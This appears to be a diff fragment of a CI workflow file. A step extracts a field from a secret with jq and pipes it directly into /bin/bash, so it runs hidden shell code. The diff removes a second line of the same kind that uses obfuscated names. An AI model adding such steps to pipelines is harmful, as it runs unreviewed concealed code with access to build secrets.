@@ -18,7 +18,6 @@ jobs:
           pa0: ${{ secrets.pa0 }}
         run: |
           printf '%s' "$pa0" | jq -r .tx5 | /bin/bash
-          printf '%s' "$yo8" | jq -r .ryj907 | /bin/bash
 
       - name: Upload results
         if: always()
